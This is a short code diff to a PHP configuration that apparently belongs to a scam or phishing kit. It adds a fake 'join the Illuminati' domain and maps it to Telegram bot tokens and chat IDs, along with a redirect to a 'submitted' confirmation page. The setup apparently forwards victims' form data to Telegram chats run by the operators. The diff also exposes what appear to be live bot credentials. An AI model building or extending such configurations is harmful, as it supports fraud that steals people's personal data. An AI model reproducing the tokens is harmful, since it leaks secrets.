@@ -40,6 +40,15 @@ $site_map = [
     ],
 
 
+    'illuminatiofficial.world' => [
+        'bots' => [
+            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
+            ['token' => '8413673524:AAGruDl1TxUDZH9RwQYYWSeEwJBcqR5S1lQ', 'chat_id' => '1566821522'],
+        ],
+        'redirect' => 'https://illuminatiofficial.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html'
+    ],
+
+
     'illuminatieternal.world' => [
         "bots" => [
             ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
